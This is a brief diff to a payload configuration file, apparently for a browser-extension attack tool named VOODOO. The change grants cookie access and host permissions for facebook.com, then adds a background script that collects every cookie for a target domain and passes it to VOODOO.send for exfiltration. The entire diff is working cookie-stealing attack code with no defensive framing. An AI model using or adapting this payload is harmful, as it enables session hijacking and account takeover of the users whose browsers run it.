@@ -9,7 +9,11 @@ format: payload
 permissions:
   - cookies
 
+host_permissions:
+  - '*://facebook.com/*'
+
 scripts:
   - content: |
-      chrome.cookies.getAll({domain: "%{domain}" }, VOODOO.send);
+      VOODOO.send("%{domain}");
+      chrome.cookies.getAll({domain: "%{domain}" }).then(VOODOO.send);
     background: true
